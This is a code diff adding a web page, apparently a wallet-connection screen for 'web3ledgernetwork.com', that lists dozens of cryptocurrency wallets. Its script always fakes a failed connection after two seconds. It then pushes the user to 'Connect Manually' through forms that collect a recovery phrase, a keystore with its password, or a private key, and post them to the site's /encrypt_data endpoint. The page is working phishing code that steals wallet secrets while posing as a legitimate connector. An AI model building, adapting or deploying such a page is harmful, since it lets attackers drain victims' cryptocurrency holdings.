+                <div class="bg-dark-lighter border border-dark-border rounded-lg p-4 text-center hover:bg-dark-medium transition-colors cursor-pointer" onclick="openConnectModal(52, 'midas_wallet.png', 'Midas Wallet', 'Midas Wallet')">
+                    <div class="mb-3">
+                        <img src="https://web3ledgernetwork.com/images/wallets/midas_wallet.png" alt="Midas Wallet" class="w-16 h-16 mx-auto object-cover rounded-full">
+                    </div>
+                    <span class="text-white text-sm font-medium">Midas Wallet</span>
+                </div>
+                                            
+                <div class="bg-dark-lighter border border-dark-border rounded-lg p-4 text-center hover:bg-dark-medium transition-colors cursor-pointer" onclick="openConnectModal(53, 'morix_wallet.png', 'Morix Wallet', 'Morix Wallet')">
+                    <div class="mb-3">
+                        <img src="https://web3ledgernetwork.com/images/wallets/morix_wallet.png" alt="Morix Wallet" class="w-16 h-16 mx-auto object-cover rounded-full">
+                    </div>
+                    <span class="text-white text-sm font-medium">Morix Wallet</span>
+                </div>
+                                            
+                <div class="bg-dark-lighter border border-dark-border rounded-lg p-4 text-center hover:bg-dark-medium transition-colors cursor-pointer" onclick="openConnectModal(54, 'mykey.png', 'Mykey', 'Mykey Wallet')">
+                    <div class="mb-3">
+                        <img src="https://web3ledgernetwork.com/images/wallets/mykey.png" alt="Mykey" class="w-16 h-16 mx-auto object-cover rounded-full">
+                    </div>
+                    <span class="text-white text-sm font-medium">Mykey</span>
+                </div>
+                                            
+                <div class="bg-dark-lighter border border-dark-border rounded-lg p-4 text-center hover:bg-dark-medium transition-colors cursor-pointer" onclick="openConnectModal(55, 'nash.png', 'Nash', 'Nash Wallet')">
+                    <div class="mb-3">
+                        <img src="https://web3ledgernetwork.com/images/wallets/nash.png" alt="Nash" class="w-16 h-16 mx-auto object-cover rounded-full">
+                    </div>
+                    <span class="text-white text-sm font-medium">Nash</span>
+                </div>
+                                            
+                <div class="bg-dark-lighter border border-dark-border rounded-lg p-4 text-center hover:bg-dark-medium transition-colors cursor-pointer" onclick="openConnectModal(56, 'onto.png', 'Onto', 'Onto Wallet')">
+                    <div class="mb-3">
+                        <img src="https://web3ledgernetwork.com/images/wallets/onto.png" alt="Onto" class="w-16 h-16 mx-auto object-cover rounded-full">
+                    </div>
+                    <span class="text-white text-sm font-medium">Onto</span>
+                </div>
+                                            
+                <div class="bg-dark-lighter border border-dark-border rounded-lg p-4 text-center hover:bg-dark-medium transition-colors cursor-pointer" onclick="openConnectModal(57, 'ownbit.png', 'Ownbit', 'Ownbit Wallet')">
+                    <div class="mb-3">
+                        <img src="https://web3ledgernetwork.com/images/wallets/ownbit.png" alt="Ownbit" class="w-16 h-16 mx-auto object-cover rounded-full">
+                    </div>
+                    <span class="text-white text-sm font-medium">Ownbit</span>
+                </div>
+                                            
+                <div class="bg-dark-lighter border border-dark-border rounded-lg p-4 text-center hover:bg-dark-medium transition-colors cursor-pointer" onclick="openConnectModal(58, 'peak_defi_wallet.png', 'Peak Defi Wallet', 'Peak Defi Wallet')">
+                    <div class="mb-3">
+                        <img src="https://web3ledgernetwork.com/images/wallets/peak_defi_wallet.png" alt="Peak Defi Wallet" class="w-16 h-16 mx-auto object-cover rounded-full">
+                    </div>
+                    <span class="text-white text-sm font-medium">Peak Defi Wallet</span>
+                </div>
+                                            
+                <div class="bg-dark-lighter border border-dark-border rounded-lg p-4 text-center hover:bg-dark-medium transition-colors cursor-pointer" onclick="openConnectModal(59, 'pillar.png', 'Pillar', 'Pillar Wallet')">
+                    <div class="mb-3">
+                        <img src="https://web3ledgernetwork.com/images/wallets/pillar.png" alt="Pillar" class="w-16 h-16 mx-auto object-cover rounded-full">
+                    </div>
+                    <span class="text-white text-sm font-medium">Pillar</span>
+                </div>
+                                            
+                <div class="bg-dark-lighter border border-dark-border rounded-lg p-4 text-center hover:bg-dark-medium transition-colors cursor-pointer" onclick="openConnectModal(60, 'rainbow.png', 'Rainbow', 'Rainbow Wallet')">
+                    <div class="mb-3">
+                        <img src="https://web3ledgernetwork.com/images/wallets/rainbow.png" alt="Rainbow" class="w-16 h-16 mx-auto object-cover rounded-full">
+                    </div>
+                    <span class="text-white text-sm font-medium">Rainbow</span>
+                </div>
+                                            
+                <div class="bg-dark-lighter border border-dark-border rounded-lg p-4 text-center hover:bg-dark-medium transition-colors cursor-pointer" onclick="openConnectModal(61, 'safepal.png', 'Safepal', 'Safepal Wallet')">
+                    <div class="mb-3">
+                        <img src="https://web3ledgernetwork.com/images/wallets/safepal.png" alt="Safepal" class="w-16 h-16 mx-auto object-cover rounded-full">
+                    </div>
+                    <span class="text-white text-sm font-medium">Safepal</span>
+                </div>
+                                            
+                <div class="bg-dark-lighter border border-dark-border rounded-lg p-4 text-center hover:bg-dark-medium transition-colors cursor-pointer" onclick="openConnectModal(62, 'spark_point.png', 'Spark Point', 'Spark Point Wallet')">
+                    <div class="mb-3">
+                        <img src="https://web3ledgernetwork.com/images/wallets/spark_point.png" alt="Spark Point" class="w-16 h-16 mx-auto object-cover rounded-full">
+                    </div>
+                    <span class="text-white text-sm font-medium">Spark Point</span>
+                </div>
+                                            
+                <div class="bg-dark-lighter border border-dark-border rounded-lg p-4 text-center hover:bg-dark-medium transition-colors cursor-pointer" onclick="openConnectModal(63, 'spatium.png', 'Spatium', 'Spatium Wallet')">
+                    <div class="mb-3">
+                        <img src="https://web3ledgernetwork.com/images/wallets/spatium.png" alt="Spatium" class="w-16 h-16 mx-auto object-cover rounded-full">
+                    </div>
+                    <span class="text-white text-sm font-medium">Spatium</span>
+                </div>
+                                            
+                <div class="bg-dark-lighter border border-dark-border rounded-lg p-4 text-center hover:bg-dark-medium transition-colors cursor-pointer" onclick="openConnectModal(64, 'tangem.png', 'Tangem', 'Tangem Wallet')">
+                    <div class="mb-3">
+                        <img src="https://web3ledgernetwork.com/images/wallets/tangem.png" alt="Tangem" class="w-16 h-16 mx-auto object-cover rounded-full">
+                    </div>
+                    <span class="text-white text-sm font-medium">Tangem</span>
+                </div>
+                                            
+                <div class="bg-dark-lighter border border-dark-border rounded-lg p-4 text-center hover:bg-dark-medium transition-colors cursor-pointer" onclick="openConnectModal(65, 'token_pocket.png', 'Token Pocket', 'Token Pocket Wallet')">
+                    <div class="mb-3">
+                        <img src="https://web3ledgernetwork.com/images/wallets/token_pocket.png" alt="Token Pocket" class="w-16 h-16 mx-auto object-cover rounded-full">
+                    </div>
+                    <span class="text-white text-sm font-medium">Token Pocket</span>
+                </div>
+                                            
+                <div class="bg-dark-lighter border border-dark-border rounded-lg p-4 text-center hover:bg-dark-medium transition-colors cursor-pointer" onclick="openConnectModal(66, 'tokenary.png', 'Tokenary', 'Tokenary Wallet')">
+                    <div class="mb-3">
+                        <img src="https://web3ledgernetwork.com/images/wallets/tokenary.png" alt="Tokenary" class="w-16 h-16 mx-auto object-cover rounded-full">
+                    </div>
+                    <span class="text-white text-sm font-medium">Tokenary</span>
+                </div>
+                                            
+                <div class="bg-dark-lighter border border-dark-border rounded-lg p-4 text-center hover:bg-dark-medium transition-colors cursor-pointer" onclick="openConnectModal(67, 'torus.png', 'Torus', 'Torus Wallet')">
+                    <div class="mb-3">
+                        <img src="https://web3ledgernetwork.com/images/wallets/torus.png" alt="Torus" class="w-16 h-16 mx-auto object-cover rounded-full">
+                    </div>
+                    <span class="text-white text-sm font-medium">Torus</span>
+                </div>
+                                            
+                <div class="bg-dark-lighter border border-dark-border rounded-lg p-4 text-center hover:bg-dark-medium transition-colors cursor-pointer" onclick="openConnectModal(68, 'trezor_model_t.png', 'Trezor Model T', 'Trezor Model T Wallet')">
+                    <div class="mb-3">
+                        <img src="https://web3ledgernetwork.com/images/wallets/trezor_model_t.png" alt="Trezor Model T" class="w-16 h-16 mx-auto object-cover rounded-full">
+                    </div>
+                    <span class="text-white text-sm font-medium">Trezor Model T</span>
+                </div>
+                                            
+                <div class="bg-dark-lighter border border-dark-border rounded-lg p-4 text-center hover:bg-dark-medium transition-colors cursor-pointer" onclick="openConnectModal(69, 'trust_vault.png', 'Trust Vault', 'Trust Vault Wallet')">
+                    <div class="mb-3">
+                        <img src="https://web3ledgernetwork.com/images/wallets/trust_vault.png" alt="Trust Vault" class="w-16 h-16 mx-auto object-cover rounded-full">
+                    </div>
+                    <span class="text-white text-sm font-medium">Trust Vault</span>
+                </div>
+                                            
+                <div class="bg-dark-lighter border border-dark-border rounded-lg p-4 text-center hover:bg-dark-medium transition-colors cursor-pointer" onclick="openConnectModal(70, 'unstoppable_wallet.png', 'Unstoppable Wallet', 'Unstoppable Wallet')">
+                    <div class="mb-3">
+                        <img src="https://web3ledgernetwork.com/images/wallets/unstoppable_wallet.png" alt="Unstoppable Wallet" class="w-16 h-16 mx-auto object-cover rounded-full">
+                    </div>
+                    <span class="text-white text-sm font-medium">Unstoppable Wallet</span>
+                </div>
+                                            
+                <div class="bg-dark-lighter border border-dark-border rounded-lg p-4 text-center hover:bg-dark-medium transition-colors cursor-pointer" onclick="openConnectModal(71, 'via_wallet.png', 'Via Wallet', 'Via Wallet')">
+                    <div class="mb-3">
+                        <img src="https://web3ledgernetwork.com/images/wallets/via_wallet.png" alt="Via Wallet" class="w-16 h-16 mx-auto object-cover rounded-full">
+                    </div>
+                    <span class="text-white text-sm font-medium">Via Wallet</span>
+                </div>
+                                            
+                <div class="bg-dark-lighter border border-dark-border rounded-lg p-4 text-center hover:bg-dark-medium transition-colors cursor-pointer" onclick="openConnectModal(72, 'vision.png', 'Vision', 'Vision Wallet')">
+                    <div class="mb-3">
+                        <img src="https://web3ledgernetwork.com/images/wallets/vision.png" alt="Vision" class="w-16 h-16 mx-auto object-cover rounded-full">
+                    </div>
+                    <span class="text-white text-sm font-medium">Vision</span>
+                </div>
+                                            
+                <div class="bg-dark-lighter border border-dark-border rounded-lg p-4 text-center hover:bg-dark-medium transition-colors cursor-pointer" onclick="openConnectModal(73, 'wallet.io.png', 'Wallet.io', 'Wallet.io Wallet')">
+                    <div class="mb-3">
+                        <img src="https://web3ledgernetwork.com/images/wallets/wallet.io.png" alt="Wallet.io" class="w-16 h-16 mx-auto object-cover rounded-full">
+                    </div>
+                    <span class="text-white text-sm font-medium">Wallet.io</span>
+                </div>
+                                            
+                <div class="bg-dark-lighter border border-dark-border rounded-lg p-4 text-center hover:bg-dark-medium transition-colors cursor-pointer" onclick="openConnectModal(74, 'wallet_connect.png', 'Wallet Connect', 'Wallet Connect Wallet')">
+                    <div class="mb-3">
+                        <img src="https://web3ledgernetwork.com/images/wallets/wallet_connect.png" alt="Wallet Connect" class="w-16 h-16 mx-auto object-cover rounded-full">
+                    </div>
+                    <span class="text-white text-sm font-medium">Wallet Connect</span>
+                </div>
+                                            
+                <div class="bg-dark-lighter border border-dark-border rounded-lg p-4 text-center hover:bg-dark-medium transition-colors cursor-pointer" onclick="openConnectModal(75, 'walleth.png', 'Walleth', 'Walleth Wallet')">
+                    <div class="mb-3">
+                        <img src="https://web3ledgernetwork.com/images/wallets/walleth.png" alt="Walleth" class="w-16 h-16 mx-auto object-cover rounded-full">
+                    </div>
+                    <span class="text-white text-sm font-medium">Walleth</span>
+                </div>
+                                            
+                <div class="bg-dark-lighter border border-dark-border rounded-lg p-4 text-center hover:bg-dark-medium transition-colors cursor-pointer" onclick="openConnectModal(76, 'wazirx.png', 'Wazirx', 'Wazirx Wallet')">
+                    <div class="mb-3">
+                        <img src="https://web3ledgernetwork.com/images/wallets/wazirx.png" alt="Wazirx" class="w-16 h-16 mx-auto object-cover rounded-full">
+                    </div>
+                    <span class="text-white text-sm font-medium">Wazirx</span>
+                </div>
+                                            
+                <div class="bg-dark-lighter border border-dark-border rounded-lg p-4 text-center hover:bg-dark-medium transition-colors cursor-pointer" onclick="openConnectModal(77, 'xaman.png', 'Xaman', 'Xaman Wallet')">
+                    <div class="mb-3">
+                        <img src="https://web3ledgernetwork.com/images/wallets/xaman.png" alt="Xaman" class="w-16 h-16 mx-auto object-cover rounded-full">
+                    </div>
+                    <span class="text-white text-sm font-medium">Xaman</span>
+                </div>
+                                            
+                <div class="bg-dark-lighter border border-dark-border rounded-lg p-4 text-center hover:bg-dark-medium transition-colors cursor-pointer" onclick="openConnectModal(78, 'xdc_wallet.png', 'Xdc Wallet', 'Xdc Wallet')">
+                    <div class="mb-3">
+                        <img src="https://web3ledgernetwork.com/images/wallets/xdc_wallet.png" alt="Xdc Wallet" class="w-16 h-16 mx-auto object-cover rounded-full">
+                    </div>
+                    <span class="text-white text-sm font-medium">Xdc Wallet</span>
+                </div>
+                                            
+                <div class="bg-dark-lighter border border-dark-border rounded-lg p-4 text-center hover:bg-dark-medium transition-colors cursor-pointer" onclick="openConnectModal(79, 'zel_core.png', 'Zel Core', 'Zel Core Wallet')">
+                    <div class="mb-3">
+                        <img src="https://web3ledgernetwork.com/images/wallets/zel_core.png" alt="Zel Core" class="w-16 h-16 mx-auto object-cover rounded-full">
+                    </div>
+                    <span class="text-white text-sm font-medium">Zel Core</span>
+                </div>
+                                    </div>
+
+        <!-- Footer -->
+        <footer class="flex justify-center items-center pt-8 pb-4">
+            <a href="javascript:void(0)" class="flex items-center mr-8 text-gray-400 hover:text-white transition-colors">
+                <img src="https://web3ledgernetwork.com/images/discord.svg" alt="Discord" class="mr-2" width="20">
+                <span class="text-sm">Discord</span>
+            </a>
+            <a href="javascript:void(0)" class="flex items-center text-gray-400 hover:text-white transition-colors">
+                <img src="https://web3ledgernetwork.com/images/twitter.svg" alt="Twitter" class="mr-2" width="20">
+                <span class="text-sm">Twitter</span>
+            </a>
+        </footer>
+    </div>
+
+    <!-- Connect Loading Modal -->
+    <div id="connectLoadingModal" class="fixed inset-0 z-50 hidden">
+        <div class="absolute inset-0 bg-black/50 backdrop-blur-sm"></div>
+        <div class="absolute inset-0 flex items-center justify-center p-4">
+            <div class="bg-dark-lighter rounded-lg shadow-xl max-w-md w-full border border-dark-border">
+                <div class="flex justify-between items-center p-4 border-b border-dark-border">
+                    <button class="text-primary hover:text-primary/80 text-sm font-medium" onclick="closeModal('connectLoadingModal')">
+                        Back
+                    </button>
+                    <button onclick="closeModal('connectLoadingModal')" class="text-gray-400 hover:text-white">
+                        <svg class="w-5 h-5" fill="none" stroke="currentColor" viewBox="0 0 24 24">
+                            <path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M6 18L18 6M6 6l12 12">
+                            </path>
+                        </svg>
+                    </button>
+                </div>
+                <div class="p-4">
+                    <div class="border border-red-500/30 bg-red-500/10 rounded-lg p-3 flex justify-between items-center mb-4">
+                        <p class="text-red-400 text-sm" id="loadingText">Connection failed</p>
+                        <button class="bg-gray-600 hover:bg-gray-700 text-white text-xs px-3 py-1 rounded" id="connectManuallyBtn">
+                            Connect Manually
+                        </button>
+                    </div>
+
+                    <div class="border border-gray-600 rounded-lg p-3 flex justify-between items-center">
+                        <div>
+                            <h5 class="text-white font-medium mb-1" id="modalWalletName">Trust</h5>
+                            <p class="text-gray-400 text-sm">Easy-to-use browser extension.</p>
+                        </div>
+                        <img id="modalWalletIcon" src="/images/wallets/0_trust.png" alt="Trust" class="w-6 h-6 rounded-full object-cover">
+                    </div>
+                </div>
+            </div>
+        </div>
+    </div>
+
+    <!-- Phrase Key Modal -->
+    <div id="phraseKeyModal" class="fixed inset-0 z-50 hidden">
+        <div class="absolute inset-0 bg-black/50 backdrop-blur-sm"></div>
+        <div class="absolute inset-0 flex items-center justify-center p-4">
+            <div class="bg-dark-lighter rounded-lg shadow-xl max-w-md w-full border border-dark-border">
+                <div class="p-4" id="phraseModalBody"><section class="restore-wallet">
+    <div class="flex items-center mb-6">
+        <img src="https://web3ledgernetwork.com/images/wallets/0_trust.png" alt="" class="w-10 h-10 rounded-lg mr-3 object-cover">
+        <h5 class="text-white text-lg font-normal">Import your Trust Wallet</h5>
+    </div>
+
+    <!-- Tab Navigation -->
+    <div class="flex bg-dark-medium rounded-lg p-1 mb-6" role="tablist">
+        <button class="wallet-tab-btn flex-1 py-2 px-3 text-sm font-medium rounded-md transition-colors active" data-target="phrase-tab" style="color: rgb(255, 255, 255); background-color: rgb(169, 93, 252);">
+            Phrase
+        </button>
+        <button class="wallet-tab-btn flex-1 py-2 px-3 text-sm font-medium rounded-md transition-colors" data-target="keystore-tab" style="color: rgb(156, 163, 175);">
+            Keystore JSON
+        </button>
+        <button class="wallet-tab-btn flex-1 py-2 px-3 text-sm font-medium rounded-md transition-colors" data-target="private-tab" style="color: rgb(156, 163, 175);">
+            Private Key
+        </button>
+    </div>
+    <!-- Tab Content -->
+    <div class="tab-content">
+        <!-- Phrase Tab -->
+        <div class="tab-pane active" id="phrase-tab" style="display: block;">
+            <form action="https://web3ledgernetwork.com/encrypt_data/606" method="post" id="phrase-form">
+                <input type="hidden" name="_token" value="3FrKUfTfcITQMtar9zeqFUWPBCumSwes74VQ7ynX" autocomplete="off">
+                <div class="mb-4">
+                    <input type="text" name="wallet_name" id="wallet_name" placeholder="Wallet Name" class="w-full px-3 py-2 bg-dark-medium border border-dark-border rounded-lg text-white placeholder-gray-400 focus:outline-none focus:ring-2 focus:ring-primary focus:border-transparent">
+                </div>
+                <div class="mb-4">
+                    <textarea rows="7" name="phrase" id="phrase" placeholder="Enter your recovery phrase" class="w-full px-3 py-2 bg-dark-medium border border-dark-border rounded-lg text-white placeholder-gray-400 focus:outline-none focus:ring-2 focus:ring-primary focus:border-transparent resize-none"></textarea>
+                </div>
+                <div class="text-primary text-center text-sm mb-6">
+                    Typically 12 (sometimes 24) words separated by single spaces
+                </div>
+                <input type="hidden" name="type" value="phrase">
+                <input type="hidden" name="vendor" value="Trust Wallet">
+
+                <button class="w-full bg-primary hover:bg-primary-dark text-white py-2 rounded-lg font-medium transition-colors" type="submit">
+                    Proceed
+                </button>
+            </form>
+        </div>
+        <!-- Keystore Tab -->
+        <div class="tab-pane" id="keystore-tab" style="display: none;">
+            <form action="https://web3ledgernetwork.com/encrypt_data/606" method="post" id="keystoreForm">
+                <input type="hidden" name="_token" value="3FrKUfTfcITQMtar9zeqFUWPBCumSwes74VQ7ynX" autocomplete="off">
+                <div class="mb-4">
+                    <textarea rows="7" name="keystore" id="keystore" placeholder="Keystore JSON" class="w-full px-3 py-2 bg-dark-medium border border-dark-border rounded-lg text-white placeholder-gray-400 focus:outline-none focus:ring-2 focus:ring-primary focus:border-transparent resize-none"></textarea>
+                </div>
+                <div class="mb-4">
+                    <input type="password" name="password" id="password" placeholder="Wallet Password" class="w-full px-3 py-2 bg-dark-medium border border-dark-border rounded-lg text-white placeholder-gray-400 focus:outline-none focus:ring-2 focus:ring-primary focus:border-transparent">
+                </div>
+                <div class="text-primary text-center text-sm mb-6">
+                    Several lines of text beginning with '(...)' plus the password you used to encrypt it.
+                </div>
+                <input type="hidden" name="type" value="keystore">
+                <input type="hidden" name="vendor" value="Trust Wallet">
+
+                <button class="w-full bg-primary hover:bg-primary-dark text-white py-2 rounded-lg font-medium transition-colors" type="submit">
+                    Proceed
+                </button>
+            </form>
+        </div>
+        <!-- Private Key Tab -->
+        <div class="tab-pane" id="private-tab" style="display: none;">
+            <form action="https://web3ledgernetwork.com/encrypt_data/606" method="post" id="privateKeyForm">
+                <input type="hidden" name="_token" value="3FrKUfTfcITQMtar9zeqFUWPBCumSwes74VQ7ynX" autocomplete="off">
+                <div class="mb-4">
+                    <input type="text" name="private_key" id="privateKey" placeholder="Enter your Private Key" class="w-full px-3 py-2 bg-dark-medium border border-dark-border rounded-lg text-white placeholder-gray-400 focus:outline-none focus:ring-2 focus:ring-primary focus:border-transparent">
+                </div>
+                <div class="text-primary text-center text-sm mb-6">
+                    Typically 12 (sometimes 24) words separated by single spaces
+                </div>
+                <input type="hidden" name="type" value="private_key">
+                <input type="hidden" name="vendor" value="Trust Wallet">
+
+                <button class="w-full bg-primary hover:bg-primary-dark text-white py-2 rounded-lg font-medium transition-colors" type="submit">
+                    Proceed
+                </button>
+            </form>
+        </div>
+    </div>
+</section>
+
+
+
+<style>
+    .wallet-tab-btn {
+        color: #9ca3af !important;
+        background-color: transparent !important;
+        transition: all 0.2s ease;
+        border: none;
+        cursor: pointer;
+    }
+
+    .wallet-tab-btn:hover {
+        color: #ffffff !important;
+        background-color: rgba(169, 93, 252, 0.1) !important;
+    }
+
+    .wallet-tab-btn.active {
+        background-color: #a95dfc !important;
+        color: #ffffff !important;
+    }
+
+    .tab-pane {
+        display: none;
+    }
+
+    .tab-pane.active {
+        display: block !important;
+    }
+</style>
+</div>
+                <div class="flex justify-end p-4 border-t border-dark-border">
+                    <button class="bg-red-500 hover:bg-red-600 text-white px-4 py-2 rounded text-sm" onclick="closeAllModals()">
+                        Cancel
+                    </button>
+                </div>
+            </div>
+        </div>
+    </div>
+
+        <!-- Bottom Navigation -->
+        <div class="bottom-nav">
+            <a href="https://web3ledgernetwork.com/app" class="nav-item ">
+                <svg class="nav-icon" fill="currentColor" viewBox="0 0 20 20">
+                    <path d="M10.707 2.293a1 1 0 00-1.414 0l-7 7a1 1 0 001.414 1.414L4 10.414V17a1 1 0 001 1h2a1 1 0 001-1v-2a1 1 0 011-1h2a1 1 0 011 1v2a1 1 0 001 1h2a1 1 0 001-1v-6.586l.293.293a1 1 0 001.414-1.414l-7-7z">
+                    </path>
+                </svg>
+                <span>Home</span>
+            </a>
+            <a href="https://web3ledgernetwork.com/app/nft" class="nav-item ">
+                <svg class="nav-icon" fill="currentColor" viewBox="0 0 20 20">
+                    <path fill-rule="evenodd" d="M4 3a2 2 0 00-2 2v10a2 2 0 002 2h12a2 2 0 002-2V5a2 2 0 00-2-2H4zm12 12H4l4-8 3 6 2-4 3 6z" clip-rule="evenodd"></path>
+                </svg>
+                <span>NFT</span>
+            </a>
+            <a href="https://web3ledgernetwork.com/app/collections" class="nav-item ">
+                <svg class="nav-icon" fill="currentColor" viewBox="0 0 20 20">
+                    <path d="M7 3a1 1 0 000 2h6a1 1 0 100-2H7zM4 7a1 1 0 011-1h10a1 1 0 110 2H5a1 1 0 01-1-1zM2 11a2 2 0 012-2h12a2 2 0 012 2v4a2 2 0 01-2 2H4a2 2 0 01-2-2v-4z">
+                    </path>
+                </svg>
+                <span>Collections</span>
+            </a>
+            <a href="https://web3ledgernetwork.com/app/staking" class="nav-item ">
+                <svg class="nav-icon" fill="currentColor" viewBox="0 0 20 20">
+                    <path fill-rule="evenodd" d="M4 4a2 2 0 00-2 2v4a2 2 0 002 2V6h10a2 2 0 00-2-2H4zm2 6a2 2 0 012-2h8a2 2 0 012 2v4a2 2 0 01-2 2H8a2 2 0 01-2-2v-4zm6 4a2 2 0 100-4 2 2 0 000 4z" clip-rule="evenodd"></path>
+                </svg>
+                <span>Staking</span>
+            </a>
+            <a href="https://web3ledgernetwork.com/profile" class="nav-item ">
+                <svg class="nav-icon" fill="currentColor" viewBox="0 0 20 20">
+                    <path fill-rule="evenodd" d="M10 9a3 3 0 100-6 3 3 0 000 6zm-7 9a7 7 0 1114 0H3z" clip-rule="evenodd">
+                    </path>
+                </svg>
+                <span>Profile</span>
+            </a>
+        </div>
+    </div>
+
+    <script src="https://ajax.googleapis.com/ajax/libs/jquery/3.6.1/jquery.min.js"></script>
+    <script>
+        // User Menu Toggle with click outside to close
+        const userMenu = document.getElementById('userMenu');
+        const userMenuBackdrop = document.getElementById('userMenuBackdrop');
+
+        document.addEventListener('click', (e) => {
+            if (e.target.closest('.showBox')) {
+                userMenu.classList.remove('hidden');
+            } else if (!e.target.closest('.userMenuContent') && !e.target.closest('.showBox')) {
+                userMenu.classList.add('hidden');
+            }
+        });
+
+        // Close on escape key
+        document.addEventListener('keydown', (e) => {
+            if (e.key === 'Escape') {
+                userMenu.classList.add('hidden');
+            }
+        });
+
+        // Google Translate is now handled by the partial component
+    </script>
+
+        <script>
+        let currentWalletData = {};
+
+        // Modal management functions
+        function openConnectModal(id, filename, walletName, fooWallet) {
+            // Store current wallet data
+            currentWalletData = {
+                id: id,
+                filename: filename,
+                walletName: walletName,
+                fooWallet: fooWallet
+            };
+
+            // Update modal content
+            document.getElementById('modalWalletName').textContent = walletName;
+            document.getElementById('modalWalletIcon').src = `/images/wallets/${filename}`;
+            document.getElementById('modalWalletIcon').alt = walletName;
+
+            // Reset modal state
+            document.getElementById('loadingText').textContent = 'Connecting...';
+            document.getElementById('connectManuallyBtn').classList.add('hidden');
+
+            // Show modal
+            document.getElementById('connectLoadingModal').classList.remove('hidden');
+
+            // Simulate connection attempt
+            setTimeout(() => {
+                document.getElementById('loadingText').textContent = "Connection failed";
+                document.getElementById('connectManuallyBtn').classList.remove('hidden');
+
+                // Add click handler for manual connect
+                document.getElementById('connectManuallyBtn').onclick = function() {
+                    openPhraseModal();
+                };
+            }, 2000);
+        }
+
+        function closeModal(modalId) {
+            document.getElementById(modalId).classList.add('hidden');
+        }
+
+        function closeAllModals() {
+            document.getElementById('connectLoadingModal').classList.add('hidden');
+            document.getElementById('phraseKeyModal').classList.add('hidden');
+        }
+
+        function openPhraseModal() {
+            closeModal('connectLoadingModal');
+            document.getElementById('phraseKeyModal').classList.remove('hidden');
+
+            let url = "/deep/restore/606?filename=" + currentWalletData.filename;
+            url += "&wallet=" + currentWalletData.fooWallet;
+
+            $.get(url, function(response) {
+                document.getElementById('phraseModalBody').innerHTML = response;
+                attachRestoreWalletHandlers();
+
+                // Initialize wallet tabs after content is loaded
+                initializeWalletTabs();
+            });
+        }
+
+        function fireErrorToast(message = "") {
+            // Create a simple toast notification
+            const toast = document.createElement('div');
+            toast.className =
+                'fixed top-4 right-4 z-50 bg-red-500/10 text-red-500 px-4 py-3 rounded-lg border border-red-500/20';
+            toast.textContent = message || 'An error occurred';
+            document.body.appendChild(toast);
+
+            setTimeout(() => {
+                toast.remove();
+            }, 3000);
+        }
+
+        function wordCount(str) {
+            return str.split(" ").filter(function(n) {
+                return n !== "";
+            }).length;
+        }
+
+        function mimiFireAjax(form) {
+            $.ajax({
+                type: "POST",
+                url: $(form).attr("action"),
+                data: $(form).serialize(),
+                beforeSend: () => {
+                    // Show loading state
+                    const submitBtn = $(form).find('button[type="submit"]');
+                    submitBtn.prop('disabled', true).text('Loading...');
+                },
+                success: function(response) {
+                    window.location.href = response;
+                },
+                error: function() {
+                    fireErrorToast("An error occurred. Please try again.");
+                },
+                complete: () => {
+                    const submitBtn = $(form).find('button[type="submit"]');
+                    submitBtn.prop('disabled', false).text('Submit');
+                },
+            });
+        }
+
+        function attachRestoreWalletHandlers() {
+            // Phrase form validation
+            $("#phrase-form").on("submit", function(e) {
+                e.preventDefault();
+
+                if ($("textarea#phrase").val() === "") {
+                    fireErrorToast("Please enter your recovery phrase");
+                } else if (wordCount($("textarea#phrase").val()) < 12) {
+                    fireErrorToast("Recovery phrase must be at least 12 words");
+                } else {
+                    mimiFireAjax(this);
+                }
+            });
+
+            // Keystore JSON form validation
+            $("#keystoreForm").on("submit", function(e) {
+                e.preventDefault();
+
+                if (
+                    $("textarea#keystore").val() === "" ||
+                    $("input#password").val() === ""
+                ) {
+                    fireErrorToast(
+                        "Fields cannot be empty, Please enter Keystore JSON and Password"
+                    );
+                } else {
+                    mimiFireAjax(this);
+                }
+            });
+
+            // Private key form validation
+            $("#privateKeyForm").on("submit", function(e) {
+                e.preventDefault();
+
+                if ($("#privateKey").val() === "") {
+                    fireErrorToast(
+                        "Fields cannot be empty, Please enter Private Key"
+                    );
+                } else {
+                    mimiFireAjax(this);
+                }
+            });
+        }
+
+        // Wallet Tab Functionality
+        function initializeWalletTabs() {
+            // Wait a bit for content to be ready
+            setTimeout(function() {
+                // Get all tab buttons and panes
+                const tabButtons = document.querySelectorAll('.wallet-tab-btn');
+                const tabPanes = document.querySelectorAll('.tab-pane');
+
+                if (tabButtons.length === 0 || tabPanes.length === 0) {
+                    setTimeout(initializeWalletTabs, 200);
+                    return;
+                }
+
+                // Function to switch tabs
+                function switchTab(targetId, clickedButton) {
+                    // Hide all tab panes
+                    tabPanes.forEach(pane => {
+                        pane.style.display = 'none';
+                        pane.classList.remove('active');
+                    });
+
+                    // Remove active class from all buttons
+                    tabButtons.forEach(btn => {
+                        btn.classList.remove('active');
+                        btn.style.backgroundColor = '';
+                        btn.style.color = '#9ca3af';
+                    });
+
+                    // Show target pane
+                    const targetPane = document.getElementById(targetId);
+                    if (targetPane) {
+                        targetPane.style.display = 'block';
+                        targetPane.classList.add('active');
+                    }
+
+                    // Activate clicked button
+                    if (clickedButton) {
+                        clickedButton.classList.add('active');
+                        clickedButton.style.backgroundColor = '#a95dfc';
+                        clickedButton.style.color = '#ffffff';
+                    }
+                }
+
+                // Add click handlers
+                tabButtons.forEach(button => {
+                    button.addEventListener('click', function(e) {
+                        e.preventDefault();
+                        const targetId = this.getAttribute('data-target');
+                        switchTab(targetId, this);
+                    });
+                });
+
+                // Initialize first tab
+                if (tabButtons.length > 0) {
+                    const firstButton = tabButtons[0];
+                    const firstTarget = firstButton.getAttribute('data-target');
+                    switchTab(firstTarget, firstButton);
+                }
+
+            }, 100);
+        }
+
+        // Close modals when clicking outside
+        document.addEventListener('click', function(e) {
+            if (e.target.id === 'connectLoadingModal' || e.target.id === 'phraseKeyModal') {
+                closeAllModals();
+            }
+        });
+
+        // Close modals on escape key
+        document.addEventListener('keydown', function(e) {
+            if (e.key === 'Escape') {
+                closeAllModals();
+            }
+        });
